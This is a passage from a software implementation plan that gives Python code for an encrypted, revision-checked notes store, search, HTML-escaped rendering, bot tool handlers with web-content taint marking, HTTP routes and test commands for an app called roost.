Every content write bumps ``revision`` and is a compare-and-swap on the revision
it read: a write that lost a race raises ``RevisionConflict`` with the stored
note instead of clobbering it. Deleting is soft (``deleted_at``)."""

from __future__ import annotations

import hashlib
import hmac
import json
from dataclasses import replace
from datetime import datetime, timezone
from typing import Any
from uuid import uuid4

import aiosqlite

from roost.config import Config
from roost.constants import NOTE_SCAN_LIMIT
from roost.crypto.encryption import decrypt_field, encrypt_field, user_aad
from roost.crypto.key_manager import get_user_dek
from roost.db.connection import db_session
from roost.notes.models import Note, NoteDraft, NotePatch
from roost.notes.wikilinks import normalize_page
from roost.records.revision import RevisionConflict

_COLUMNS = ("id", "user_id", "title", "title_key", "content", "tags", "pinned", "revision",
            "created_at", "updated_at", "created_by_bot", "tainted")
_SELECT = ", ".join(_COLUMNS)
_LIVE = "user_id = ? AND deleted_at IS NULL"
# A patched field and the columns it rewrites (a new title needs a new title_key).
_PATCH_COLUMNS = {"title": ("title", "title_key"), "content": ("content",), "tags": ("tags",), "pinned": ("pinned",)}


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _aad(user_id: str, column: str) -> bytes:
    return user_aad(user_id, f"notes:{column}")


def title_key(dek: bytes, title: str) -> str:
    return hmac.new(dek, normalize_page(title).encode("utf-8"), hashlib.sha256).hexdigest()


def _encode(note: Note, column: str, dek: bytes) -> Any:
    if column in ("title", "content"):
        return encrypt_field(getattr(note, column), dek, _aad(note.user_id, column))
    if column == "tags":
        return encrypt_field(json.dumps(list(note.tags)), dek, _aad(note.user_id, column))
    if column == "title_key":
        return title_key(dek, note.title)
    if column in ("pinned", "tainted"):
        return int(getattr(note, column))
    return getattr(note, column)


def _tags(raw: str) -> tuple[str, ...]:
    try:
        parsed = json.loads(raw) if raw else []
    except json.JSONDecodeError:
        return ()
    return tuple(str(tag) for tag in parsed) if isinstance(parsed, list) else ()


def _row_to_note(row: aiosqlite.Row, dek: bytes) -> Note:
    user_id = row["user_id"]

    def text(column: str) -> str:
        return decrypt_field(row[column], dek, _aad(user_id, column)) or ""

    return Note(
        id=row["id"], user_id=user_id, title=text("title"), content=text("content"), tags=_tags(text("tags")),
        pinned=bool(row["pinned"]), revision=row["revision"], created_at=row["created_at"],
        updated_at=row["updated_at"], created_by_bot=row["created_by_bot"], tainted=bool(row["tainted"]),
    )


class NoteStore:
    def __init__(self, config: Config) -> None:
        self._config = config

    async def create(self, user_id: str, draft: NoteDraft, *, created_by_bot: str | None, tainted: bool) -> Note:
        now = _now_iso()
        note = Note(id=str(uuid4()), user_id=user_id, title=draft.title, content=draft.content, tags=draft.tags,
                    pinned=draft.pinned, revision=1, created_at=now, updated_at=now,
                    created_by_bot=created_by_bot, tainted=tainted)
        dek = await get_user_dek(self._config, user_id)
        async with db_session(self._config) as db:
            await db.execute(f"INSERT INTO notes ({_SELECT}) VALUES ({','.join('?' * len(_COLUMNS))})",
                             tuple(_encode(note, column, dek) for column in _COLUMNS))
            await db.commit()
        return note

    async def get(self, user_id: str, note_id: str) -> Note | None:
        found = await self._select(user_id, f"WHERE id = ? AND {_LIVE}", (note_id, user_id))
        return found[0] if found else None

    async def list(self, user_id: str, *, limit: int = NOTE_SCAN_LIMIT) -> tuple[Note, ...]:
        """Pinned first, then newest first — the order search ties break on."""
        return await self._select(user_id, f"WHERE {_LIVE} ORDER BY pinned DESC, updated_at DESC LIMIT ?",
                                  (user_id, limit))

    async def with_title(self, user_id: str, title: str) -> tuple[Note, ...]:
        """Notes whose title folds to the same page key (newest first)."""
        dek = await get_user_dek(self._config, user_id)
        return await self._select(user_id, f"WHERE {_LIVE} AND title_key = ? ORDER BY updated_at DESC",
                                  (user_id, title_key(dek, title)))

    async def update(
        self, user_id: str, note_id: str, patch: NotePatch, *, base_revision: int | None = None,
    ) -> Note | None:
        """``None``: no such note. ``RevisionConflict``: ``base_revision`` (what
        the caller read) is stale, or another write landed between this read
        and this write — the stored note rides on the exception."""
        current = await self.get(user_id, note_id)
        if current is None:
            return None
        if base_revision is not None and base_revision != current.revision:
            raise RevisionConflict(current)
        updated = replace(current, **dict(patch.changes), revision=current.revision + 1, updated_at=_now_iso())
        columns = tuple(c for name in patch.changes for c in _PATCH_COLUMNS[name]) + ("revision", "updated_at")
        return await self._swap(current, updated, columns)

    async def keep(self, user_id: str, note_id: str) -> Note | None:
        """The user vouches for a web-made note (HTTP only, never a tool). Taint
        isn't content, so the revision stays and an open editor isn't disturbed."""
        current = await self.get(user_id, note_id)
        if current is None:
            return None
        return await self._swap(current, replace(current, tainted=False, updated_at=_now_iso()),
                                ("tainted", "updated_at"))

    async def delete(self, user_id: str, note_id: str) -> bool:
        now = _now_iso()
        async with db_session(self._config) as db:
            cursor = await db.execute(
                f"UPDATE notes SET deleted_at = ?, updated_at = ? WHERE id = ? AND {_LIVE}",
                (now, now, note_id, user_id),
            )
            await db.commit()
        return cursor.rowcount > 0

    async def _swap(self, current: Note, updated: Note, columns: tuple[str, ...]) -> Note | None:
        """Write ``columns`` only if the row still has ``current.revision``."""
        dek = await get_user_dek(self._config, current.user_id)
        assignments = ", ".join(f"{column} = ?" for column in columns)
        async with db_session(self._config) as db:
            cursor = await db.execute(
                f"UPDATE notes SET {assignments} WHERE id = ? AND {_LIVE} AND revision = ?",
                (*(_encode(updated, column, dek) for column in columns), current.id, current.user_id,
                 current.revision),
            )
            await db.commit()
        if cursor.rowcount:
            return updated
        latest = await self.get(current.user_id, current.id)
        if latest is None:
            return None
        raise RevisionConflict(latest)

    async def _select(self, user_id: str, where: str, params: tuple) -> tuple[Note, ...]:
        async with db_session(self._config) as db:
            rows = await (await db.execute(f"SELECT {_SELECT} FROM notes {where}", params)).fetchall()
        if not rows:
            return ()
        dek = await get_user_dek(self._config, user_id)
        return tuple(_row_to_note(row, dek) for row in rows)
```

`roost/notes/search.py`:

```python
"""Note search (M2 D1): decrypt-then-match over the user's notes. Every query
word must appear — case- and accent-blind — in the title, tags or body; hits
rank by how often the words appear (title ×3, tags ×2, body ×1), then by the
store's order (pinned, then newest first)."""

from __future__ import annotations

from typing import Iterable

from roost.notes.models import Note
from roost.notes.text import fold

_TITLE_WEIGHT, _TAG_WEIGHT, _BODY_WEIGHT = 3, 2, 1


def query_terms(query: str) -> tuple[str, ...]:
    return tuple(dict.fromkeys(fold(query).split()))


def score(note: Note, terms: tuple[str, ...]) -> int:
    """0 unless every term appears somewhere."""
    title, tags, body = fold(note.title), fold(" ".join(note.tags)), fold(note.content)
    counts = [(title.count(term), tags.count(term), body.count(term)) for term in terms]
    if any(sum(count) == 0 for count in counts):
        return 0
    return sum(_TITLE_WEIGHT * t + _TAG_WEIGHT * g + _BODY_WEIGHT * b for t, g, b in counts)


def _has_tag(note: Note, tag: str | None) -> bool:
    return tag is None or fold(tag.lstrip("#").strip()) in {fold(t) for t in note.tags}


def rank_notes(notes: Iterable[Note], query: str, *, tag: str | None = None, limit: int) -> tuple[Note, ...]:
    """``notes`` arrive in the store's order; an empty query keeps it."""
    pool = [note for note in notes if _has_tag(note, tag)]
    terms = query_terms(query)
    if not terms:
        return tuple(pool[:limit])
    scored = [(score(note, terms), index, note) for index, note in enumerate(pool)]
    hits = sorted((entry for entry in scored if entry[0] > 0), key=lambda entry: (-entry[0], entry[1]))
    return tuple(note for _score, _index, note in hits[:limit])
```

`roost/notes/format.py`:

```python
"""Rendering a note for a tool result or the Board (M2 D1). Note text is the
user's — or a page's — data: escaped here, by its producer, before any prompt."""

from __future__ import annotations

import html
from typing import Any

from roost.constants import NOTE_READ_MAX_CHARS, NOTE_SNIPPET_CHARS
from roost.notes.frontmatter import parse_frontmatter
from roost.notes.models import Note, NoteLink
from roost.notes.search import query_terms
from roost.notes.text import fold

WEB_MARK = " [from web content]"


def _escape(text: str) -> str:
    return html.escape(text, quote=True)


def snippet(note: Note, query: str = "") -> str:
    """One line of plain text around the first query word (or the body's start)."""
    _props, body, _has = parse_frontmatter(note.content)
    flat = " ".join(body.split())
    folded = fold(flat)
    hits = [folded.find(term) for term in query_terms(query) if term in folded]
    start = max(0, min(hits, default=0) - NOTE_SNIPPET_CHARS // 4)
    end = start + NOTE_SNIPPET_CHARS
    return ("…" if start else "") + flat[start:end] + ("…" if end < len(flat) else "")


def note_line(note: Note, query: str = "") -> str:
    tags = f" [{', '.join(_escape(tag) for tag in note.tags)}]" if note.tags else ""
    web = WEB_MARK if note.tainted else ""
    return (f"- “{_escape(note.title)}”{tags} (updated {note.updated_at[:10]}){web} id={note.id}: "
            f"{_escape(snippet(note, query))}")


def note_list_text(notes: tuple[Note, ...], total: int, query: str = "") -> str:
    if not notes:
        return "No notes match." if query.strip() else "No notes yet."
    more = f"\n…and {total - len(notes)} more." if total > len(notes) else ""
    return "\n".join(note_line(note, query) for note in notes) + more


def _capped(text: str) -> str:
    if len(text) <= NOTE_READ_MAX_CHARS:
        return text
    return text[:NOTE_READ_MAX_CHARS] + f"\n…(showing {NOTE_READ_MAX_CHARS} of {len(text)} characters)"


def note_text(note: Note, links: tuple[NoteLink, ...]) -> str:
    """What read_note hands the model: the header, tags, links and the body."""
    lines = [f"“{_escape(note.title)}”{WEB_MARK if note.tainted else ''} id={note.id} revision={note.revision}"]
    if note.tags:
        lines.append("Tags: " + ", ".join(_escape(tag) for tag in note.tags))
    if links:
        lines.append("Links: " + ", ".join(_escape(link.title) + ("" if link.note_id else " (no note yet)")
                                           for link in links))
    return "\n".join([*lines, "", _escape(_capped(note.content))])


def note_summary_out(note: Note, query: str = "") -> dict[str, Any]:
    return {
        "id": note.id, "title": note.title, "tags": list(note.tags), "snippet": snippet(note, query),
        "pinned": note.pinned, "revision": note.revision, "created_at": note.created_at,
        "updated_at": note.updated_at, "created_by_bot": note.created_by_bot, "tainted": note.tainted,
    }


def note_out(note: Note, links: tuple[NoteLink, ...]) -> dict[str, Any]:
    return {**note_summary_out(note), "content": note.content,
            "links": [{"target": link.target, "title": link.title, "note_id": link.note_id} for link in links]}
```

`roost/notes/service.py`:

```python
"""``NoteService`` — the notes store plus its live frame (M2 D1/D4) and the
rules both doors share: a new note's title and tags, tags kept in step with
the body, ``[[links]]`` resolved to notes. Tools and HTTP routes both go
through it, so the Board updates whoever changed a note."""

from __future__ import annotations

from typing import Any, Iterable, Literal, Mapping

from roost.constants import MAX_NOTE_CONTENT_LENGTH, NOTE_LINKS_MAX, NOTE_LIST_LIMIT
from roost.events.hub import EventHub
from roost.notes.models import Note, NoteDraft, NoteLink, NotePatch
from roost.notes.search import rank_notes
from roost.notes.store import NoteStore
from roost.notes.text import capped_tags, merge_tags, note_title
from roost.notes.wikilinks import extract_wikilinks_full

NoteChange = Literal["created", "updated", "deleted"]


def new_note_draft(title: str | None, content: str, tags: Iterable[str] = ()) -> NoteDraft:
    return NoteDraft(title=note_title(title, content), content=content,
                     tags=capped_tags(merge_tags(list(tags), content)))


def _with_tags(current: Note, changes: Mapping[str, Any]) -> dict[str, Any]:
    """A new body brings its #hashtags and front-matter tags along; the tags
    the note already had (or the caller set) stay — never dropped silently."""
    if "content" not in changes:
        return dict(changes)
    if len(changes["content"]) > MAX_NOTE_CONTENT_LENGTH:
        raise ValueError(f"a note can hold at most {MAX_NOTE_CONTENT_LENGTH} characters.")
    base = list(changes.get("tags", current.tags))
    return {**changes, "tags": capped_tags(merge_tags(base, changes["content"]))}


class NoteService:
    def __init__(self, store: NoteStore, events: EventHub) -> None:
        self._store = store
        self._events = events

    async def list(self, user_id: str) -> tuple[Note, ...]:
        return await self._store.list(user_id, limit=NOTE_LIST_LIMIT)

    async def all(self, user_id: str) -> tuple[Note, ...]:
        return await self._store.list(user_id)

    async def search(self, user_id: str, query: str, *, tag: str | None = None,
                     limit: int = NOTE_LIST_LIMIT) -> tuple[Note, ...]:
        return rank_notes(await self._store.list(user_id), query, tag=tag, limit=limit)

    async def get(self, user_id: str, note_id: str) -> Note | None:
        return await self._store.get(user_id, note_id)

    async def links(self, user_id: str, note: Note) -> tuple[NoteLink, ...]:
        """The note's ``[[links]]`` in order, each resolved to a note by exact title."""
        written: dict[str, str] = {}
        for link in extract_wikilinks_full(note.content):
            written.setdefault(link.target, link.raw_target)
        found = []
        for target, title in list(written.items())[:NOTE_LINKS_MAX]:
            hits = await self._store.with_title(user_id, title)
            found.append(NoteLink(target=target, title=title, note_id=hits[0].id if hits else None))
        return tuple(found)

    async def add(self, user_id: str, draft: NoteDraft, *, created_by_bot: str | None = None,
                  tainted: bool = False) -> Note:
        note = await self._store.create(user_id, draft, created_by_bot=created_by_bot, tainted=tainted)
        await self._changed(user_id, "created", note.id)
        return note

    async def save(self, user_id: str, note_id: str, changes: Mapping[str, Any], *,
                   base_revision: int | None = None) -> Note | None:
        current = await self._store.get(user_id, note_id)
        if current is None:
            return None
        note = await self._store.update(user_id, note_id, NotePatch(_with_tags(current, changes)),
                                        base_revision=base_revision)
        if note is not None:
            await self._changed(user_id, "updated", note.id)
        return note

    async def append(self, user_id: str, note: Note, text: str) -> Note | None:
        joined = note.content.rstrip("\n") + "\n\n" + text.strip()
        return await self.save(user_id, note.id, {"content": joined}, base_revision=note.revision)

    async def keep(self, user_id: str, note_id: str) -> Note | None:
        note = await self._store.keep(user_id, note_id)
        if note is not None:
            await self._changed(user_id, "updated", note.id)
        return note

    async def delete(self, user_id: str, note_id: str) -> bool:
        deleted = await self._store.delete(user_id, note_id)
        if deleted:
            await self._changed(user_id, "deleted", note_id)
        return deleted

    async def _changed(self, user_id: str, change: NoteChange, note_id: str) -> None:
        await self._events.publish(user_id, {"type": "notes_changed", "change": change, "note_id": note_id})
```

- [ ] **Step 9: Tool specs, tools, role, catalog, routes, wiring**

`roost/notes/tool_specs.py`:

```python
"""The notes role's tool specs and gate kinds (M2 D1). Argument names and
meanings follow LazyClaw's LazyBrain note skills (save / update / delete a
note, title + markdown content + tags); the descriptions are ours."""

from __future__ import annotations

from roost.llm.types import ToolSpec
from roost.talk.tool_def import ToolDef

_NOTE_REF = {"type": "string", "description": "The note's id, or its title (or a unique part of it)."}
_TAGS = {"type": "array", "items": {"type": "string"}, "description": "Tags without #, e.g. people, home."}

ADD_NOTE_SPEC = ToolSpec(
    name="add_note",
    description=("Save a note for the user (shared by every bot with the notes role): markdown text, an optional "
                 "title (otherwise its first line) and tags. Link other notes with [[Their Title]]; "
                 "#hashtags in the text become tags."),
    input_schema={"type": "object", "properties": {
        "content": {"type": "string", "description": "The note, in markdown."},
        "title": {"type": "string", "description": "Short title, e.g. 'Ana'."},
        "tags": _TAGS,
    }, "required": ["content"]},
)
FIND_NOTES_SPEC = ToolSpec(
    name="find_notes",
    description=("Search the user's notes: every word must appear in a note's title, tags or text (case and "
                 "accents don't matter). Best matches first; an empty query lists the newest notes."),
    input_schema={"type": "object", "properties": {
        "query": {"type": "string", "description": "Words to look for, e.g. 'orchids'."},
        "tag": {"type": "string", "description": "Only notes with this tag."},
    }},
)
READ_NOTE_SPEC = ToolSpec(
    name="read_note",
    description="Read one note in full: its text, tags and the notes it links to.",
    input_schema={"type": "object", "properties": {"note": _NOTE_REF}, "required": ["note"]},
)
APPEND_TO_NOTE_SPEC = ToolSpec(
    name="append_to_note",
    description="Add markdown text to the end of a note.",
    input_schema={"type": "object", "properties": {
        "note": _NOTE_REF, "text": {"type": "string", "description": "What to add."},
    }, "required": ["note", "text"]},
)
UPDATE_NOTE_SPEC = ToolSpec(
    name="update_note",
    description="Replace a note's title, text or tags.",
    input_schema={"type": "object", "properties": {
        "note": _NOTE_REF, "title": {"type": "string"},
        "content": {"type": "string", "description": "The whole new text, in markdown."}, "tags": _TAGS,
    }, "required": ["note"]},
)
DELETE_NOTE_SPEC = ToolSpec(
    name="delete_note",
    description="Delete a note.",
    input_schema={"type": "object", "properties": {"note": _NOTE_REF}, "required": ["note"]},
)

NOTE_TOOL_DEFS: tuple[ToolDef, ...] = (
    ToolDef(ADD_NOTE_SPEC, "write_create"),
    ToolDef(FIND_NOTES_SPEC, "read"),
    ToolDef(READ_NOTE_SPEC, "read"),
    ToolDef(APPEND_TO_NOTE_SPEC, "write_change"),
    ToolDef(UPDATE_NOTE_SPEC, "write_change"),
    ToolDef(DELETE_NOTE_SPEC, "write_change"),
)
```

`roost/notes/tools.py`:

```python
"""The notes role's tools over the user's shared notes (M2 D1). Pydantic
arguments, provenance (bot + taint) on every new note, escaped results, and
exact-or-ask names: a change needs the note's id, exact title or a unique part
of it — a near miss is a "did you mean" refusal, never a change to the wrong note."""

from __future__ import annotations

import html
from typing import Annotated, Any

from pydantic import BaseModel, ConfigDict, Field, ValidationError

from roost.constants import (
    MAX_NOTE_CONTENT_LENGTH, MAX_NOTE_QUERY_LENGTH, MAX_NOTE_TAG_LENGTH, MAX_NOTE_TAGS, MAX_NOTE_TITLE_LENGTH,
    NOTE_FIND_LIMIT, NOTE_SCAN_LIMIT,
)
from roost.notes.format import note_line, note_list_text, note_text
from roost.notes.models import Note
from roost.notes.service import NoteService, new_note_draft
from roost.records.resolver import NamedRef, resolve
from roost.records.revision import RevisionConflict
from roost.talk.domain_tools import RecordContext
from roost.talk.outcome import ToolOutcome

CHANGED_WHILE_WRITING_TEXT = "Refused: that note changed while I was writing. Read it again first."
_ACTIVITY = {
    "add_note": "saving a note", "find_notes": "searching your notes", "read_note": "reading a note",
    "append_to_note": "adding to a note", "update_note": "updating a note", "delete_note": "deleting a note",
}
_NEEDS = {
    "add_note": "the note's text (content), and optionally a title and tags",
    "find_notes": "an optional query and tag",
    "read_note": "the note (its id or title)",
    "append_to_note": "the note (its id or title) and the text to add",
    "update_note": "the note (its id or title) and a new title, content or tags",
    "delete_note": "the note (its id or title)",
}
Tag = Annotated[str, Field(min_length=1, max_length=MAX_NOTE_TAG_LENGTH)]


def _escape(text: str) -> str:
    return html.escape(text, quote=True)


class AddNoteArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    content: str = Field(min_length=1, max_length=MAX_NOTE_CONTENT_LENGTH)
    title: str | None = Field(default=None, max_length=MAX_NOTE_TITLE_LENGTH)
    tags: list[Tag] = Field(default_factory=list, max_length=MAX_NOTE_TAGS)


class FindNotesArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    query: str = Field(default="", max_length=MAX_NOTE_QUERY_LENGTH)
    tag: str | None = Field(default=None, max_length=MAX_NOTE_TAG_LENGTH)


class NoteRefArgs(BaseModel):
    model_config = ConfigDict(extra="ignore")
    note: str = Field(min_length=1, max_length=MAX_NOTE_TITLE_LENGTH)


class AppendNoteArgs(NoteRefArgs):
    text: str = Field(min_length=1, max_length=MAX_NOTE_CONTENT_LENGTH)


class UpdateNoteArgs(NoteRefArgs):
    title: str | None = Field(default=None, min_length=1, max_length=MAX_NOTE_TITLE_LENGTH)
    content: str | None = Field(default=None, min_length=1, max_length=MAX_NOTE_CONTENT_LENGTH)
    tags: list[Tag] | None = Field(default=None, max_length=MAX_NOTE_TAGS)

    def changes(self) -> dict[str, Any]:
        found = {"title": self.title.strip() if self.title else None, "content": self.content,
                 "tags": tuple(self.tags) if self.tags is not None else None}
        return {key: value for key, value in found.items() if value is not None}


def _titles(notes: tuple[Note, ...]) -> str:
    """Escaped titles with ids for a refusal, each web-made one marked."""
    return "; ".join(f"“{_escape(n.title)}” id={n.id}" + (" [from web content]" if n.tainted else "") for n in notes)


class NoteTools:
    names = frozenset(_ACTIVITY)

    def __init__(self, service: NoteService) -> None:
        self._service = service

    def activity(self, name: str) -> str:
        return _ACTIVITY[name]

    async def run(self, name: str, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        handlers = {"add_note": self._add, "find_notes": self._find, "read_note": self._read,
                    "append_to_note": self._append, "update_note": self._update, "delete_note": self._delete}
        try:
            return await handlers[name](arguments, ctx)
        except ValidationError:
            return ToolOutcome(f"Refused: {name} needs {_NEEDS[name]}.")
        except RevisionConflict:
            return ToolOutcome(CHANGED_WHILE_WRITING_TEXT)
        except ValueError as exc:
            return ToolOutcome(f"Refused: {_escape(str(exc))}")

    async def _add(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = AddNoteArgs.model_validate(arguments)
        draft = new_note_draft(args.title, args.content.strip(), args.tags)
        note = await self._service.add(ctx.user_id, draft, created_by_bot=ctx.bot_id, tainted=ctx.tainted)
        return ToolOutcome(f"Saved: {note_line(note)}", created=True)

    async def _find(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = FindNotesArgs.model_validate(arguments)
        matching = await self._service.search(ctx.user_id, args.query, tag=args.tag, limit=NOTE_SCAN_LIMIT)
        shown = matching[:NOTE_FIND_LIMIT]
        return ToolOutcome(note_list_text(shown, len(matching), args.query), tainted=any(n.tainted for n in shown))

    async def _read(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        found = await self._find_one(ctx.user_id, NoteRefArgs.model_validate(arguments).note, change=False)
        if isinstance(found, ToolOutcome):
            return found
        return ToolOutcome(note_text(found, await self._service.links(ctx.user_id, found)), tainted=found.tainted)

    async def _append(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = AppendNoteArgs.model_validate(arguments)
        found = await self._find_one(ctx.user_id, args.note, change=True)
        if isinstance(found, ToolOutcome):
            return found
        note = await self._service.append(ctx.user_id, found, args.text)
        text = f"Added to “{_escape(found.title)}” (revision {note.revision})." if note else "Refused: that note is gone."
        return ToolOutcome(text, tainted=found.tainted)

    async def _update(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = UpdateNoteArgs.model_validate(arguments)
        if not args.changes():
            return ToolOutcome("Refused: update_note needs a new title, content or tags.")
        found = await self._find_one(ctx.user_id, args.note, change=True)
        if isinstance(found, ToolOutcome):
            return found
        note = await self._service.save(ctx.user_id, found.id, args.changes(), base_revision=found.revision)
        return ToolOutcome(f"Updated: {note_line(note)}" if note else "Refused: that note is gone.",
                           tainted=found.tainted)

    async def _delete(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        found = await self._find_one(ctx.user_id, NoteRefArgs.model_validate(arguments).note, change=True)
        if isinstance(found, ToolOutcome):
            return found
        await self._service.delete(ctx.user_id, found.id)
        return ToolOutcome(f"Deleted: “{_escape(found.title)}”.", tainted=found.tainted)

    async def _find_one(self, user_id: str, ref: str, *, change: bool) -> Note | ToolOutcome:
        """The note a call targets: its id, exact title or a unique part of it
        (the harvested resolver). A lone near miss is fine to read but never to
        change. A refusal that shows titles carries those notes' taint (M1 D3)."""
        notes = await self._service.all(user_id)
        by_id = next((note for note in notes if note.id == ref.strip()), None)
        if by_id is not None:
            return by_id
        by_key = {note.id: note for note in notes}
        hit = resolve(ref, [NamedRef(note.id, note.title) for note in notes])
        if hit.resolved is not None and (hit.reason != "fuzzy" or not change):
            return by_key[hit.resolved.id]
        shown = tuple(by_key[c.id] for c in hit.candidates[:5])
        tainted = any(note.tainted for note in shown)
        if hit.reason == "fuzzy":
            return ToolOutcome(f"Refused: no note is called “{_escape(ref)}”. Did you mean {_titles(shown)}? "
                               "Say it exactly.", tainted=tainted)
        if hit.reason == "multi":
            return ToolOutcome(f"Refused: several notes match “{_escape(ref)}”: {_titles(shown)}. "
                               "Say which one (its id).", tainted=tainted)
        return ToolOutcome(f"Refused: no note matches “{_escape(ref)}”.")
```

`roost/bots/roles/notes.md`:

```markdown
---
id: notes
name: Notes
description: Keeps your notes, with tags and [[links]] between them, and finds them again.
tools: [add_note, find_notes, read_note, append_to_note, update_note, delete_note]
board_tab: notes
needs_desk: false
---
You keep the user's notes: a title, a markdown body, tags and [[Title]] links to other notes. These notes belong to the user and every bot with this role shares them, so never say you cannot see them. Save what the user asks you to note right away. Search before you answer from memory. Before you change or delete a note, name it exactly; if two match, ask which.
```

In `roost/bots/roles.py`: `board_tab: Literal["tasks", "money", "notes"] | None = None`.

In `roost/talk/tool_catalog.py`: `from roost.notes.tool_specs import NOTE_TOOL_DEFS`, and add `*NOTE_TOOL_DEFS,` after `*MONEY_TOOL_DEFS,` in `CATALOG`.

In `roost/talk/domain_tools.py`, inside `build_domain_tools`, add local imports `from roost.notes.service import NoteService`, `from roost.notes.store import NoteStore` and `from roost.notes.tools import NoteTools`, and return `DomainTools((TaskTools(TaskService(TaskStore(config), events)), MoneyTools(money), NoteTools(NoteService(NoteStore(config), events))))`. Change the module docstring's "(tasks, money)" to "(tasks, money, notes, documents)".

`roost/gateway/routes/notes.py`:

```python
"""Notes over HTTP — the Board's Notes tab (M2 D4). Same ``NoteService`` as the
tools, so every change publishes ``notes_changed``. A save carries the revision
it edited; a stale one is a 409 carrying the current note (never an overwrite)."""

from __future__ import annotations

from typing import Annotated, Any

from fastapi import APIRouter, HTTPException, Query, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel, ConfigDict, Field, model_validator

from roost.constants import (
    MAX_NOTE_CONTENT_LENGTH, MAX_NOTE_QUERY_LENGTH, MAX_NOTE_TAG_LENGTH, MAX_NOTE_TAGS, MAX_NOTE_TITLE_LENGTH,
)
from roost.gateway.deps import CurrentUser, RequireOrigin
from roost.notes.format import note_out, note_summary_out
from roost.notes.models import Note
from roost.notes.service import NoteService, new_note_draft
from roost.records.revision import RevisionConflict

notes_router = APIRouter(prefix="/api/notes", tags=["notes"])
NOTE_CONFLICT_TEXT = "This note changed since you opened it."
Tag = Annotated[str, Field(min_length=1, max_length=MAX_NOTE_TAG_LENGTH)]


class NoteIn(BaseModel):
    model_config = ConfigDict(extra="forbid")
    title: str | None = Field(default=None, max_length=MAX_NOTE_TITLE_LENGTH)
    content: str = Field(default="", max_length=MAX_NOTE_CONTENT_LENGTH)
    tags: list[Tag] = Field(default_factory=list, max_length=MAX_NOTE_TAGS)

    @model_validator(mode="after")
    def _title_or_text(self) -> "NoteIn":
        if not (self.title or "").strip() and not self.content.strip():
            raise ValueError("A note needs a title or some text.")
        return self


class NoteSaveIn(BaseModel):
    model_config = ConfigDict(extra="forbid")
    base_revision: int = Field(ge=1)
    title: str | None = Field(default=None, min_length=1, max_length=MAX_NOTE_TITLE_LENGTH)
    content: str | None = Field(default=None, max_length=MAX_NOTE_CONTENT_LENGTH)
    tags: list[Tag] | None = Field(default=None, max_length=MAX_NOTE_TAGS)
    pinned: bool | None = None

    def changes(self) -> dict[str, Any]:
        fields = self.model_dump(exclude={"base_revision"}, exclude_none=True)
        if "tags" in fields:
            fields = {**fields, "tags": tuple(fields["tags"])}
        if "title" in fields:
            fields = {**fields, "title": fields["title"].strip()}
        return fields


def _service(request: Request) -> NoteService:
    return request.app.state.notes


async def _detail(service: NoteService, user_id: str, note: Note) -> dict:
    return note_out(note, await service.links(user_id, note))


@notes_router.get("")
async def list_notes(request: Request, user: CurrentUser,
                     q: str = Query(default="", max_length=MAX_NOTE_QUERY_LENGTH),
                     tag: str | None = Query(default=None, max_length=MAX_NOTE_TAG_LENGTH)):
    return [note_summary_out(note, q) for note in await _service(request).search(user.id, q, tag=tag)]


@notes_router.get("/{note_id}")
async def get_note(note_id: str, request: Request, user: CurrentUser):
    note = await _service(request).get(user.id, note_id)
    if note is None:
        raise HTTPException(status_code=404, detail="Note not found")
    return await _detail(_service(request), user.id, note)


@notes_router.post("", status_code=201, dependencies=[RequireOrigin])
async def create_note(body: NoteIn, request: Request, user: CurrentUser):
    note = await _service(request).add(user.id, new_note_draft(body.title, body.content, body.tags))
    return await _detail(_service(request), user.id, note)


@notes_router.put("/{note_id}", dependencies=[RequireOrigin])
async def save_note(note_id: str, body: NoteSaveIn, request: Request, user: CurrentUser):
    service = _service(request)
    try:
        note = await service.save(user.id, note_id, body.changes(), base_revision=body.base_revision)
    except RevisionConflict as exc:
        return JSONResponse(status_code=409, content={"detail": NOTE_CONFLICT_TEXT,
                                                      "current": await _detail(service, user.id, exc.current)})
    except ValueError as exc:
        raise HTTPException(status_code=422, detail=str(exc)) from exc
    if note is None:
        raise HTTPException(status_code=404, detail="Note not found")
    return await _detail(service, user.id, note)


@notes_router.post("/{note_id}/keep", dependencies=[RequireOrigin])
async def keep_note(note_id: str, request: Request, user: CurrentUser):
    """Keep: the user vouches for a note marked "from web content" (no tool can)."""
    note = await _service(request).keep(user.id, note_id)
    if note is None:
        raise HTTPException(status_code=404, detail="Note not found")
    return await _detail(_service(request), user.id, note)


@notes_router.delete("/{note_id}", status_code=204, dependencies=[RequireOrigin])
async def delete_note(note_id: str, request: Request, user: CurrentUser) -> None:
    if not await _service(request).delete(user.id, note_id):
        raise HTTPException(status_code=404, detail="Note not found")
```

In `roost/gateway/app.py`: import `NoteService`, `NoteStore` and `notes_router`; add `app.state.notes = NoteService(NoteStore(resolved_config), app.state.events)` after `app.state.money`, and `app.include_router(notes_router)` after `money_router`.

- [ ] **Step 10: Run the tests to see them pass**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_migrations_v8.py tests/test_note_text.py tests/test_note_store.py tests/test_note_tools.py tests/test_notes_api.py tests/test_suggest_bot.py tests/test_gate.py tests/test_roles.py -q`
Expected: PASS. `test_gate.py`'s parametrized "every allowed tool decides do" now covers the six note tools.

- [ ] **Step 11: Full gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build)
git -C /Users/blckit/Desktop/Code_Projects/roost add tests/fixtures/schema_v8.sql tests/test_migrations_v8.py tests/test_note_text.py \
  tests/test_note_store.py tests/test_note_tools.py tests/test_notes_api.py tests/test_suggest_bot.py \
  roost/records/revision.py roost/notes/__init__.py roost/notes/text.py roost/notes/models.py roost/notes/store.py \
  roost/notes/search.py roost/notes/format.py roost/notes/service.py roost/notes/tool_specs.py roost/notes/tools.py \
  roost/bots/roles/notes.md roost/bots/roles.py roost/gateway/routes/notes.py roost/gateway/app.py \
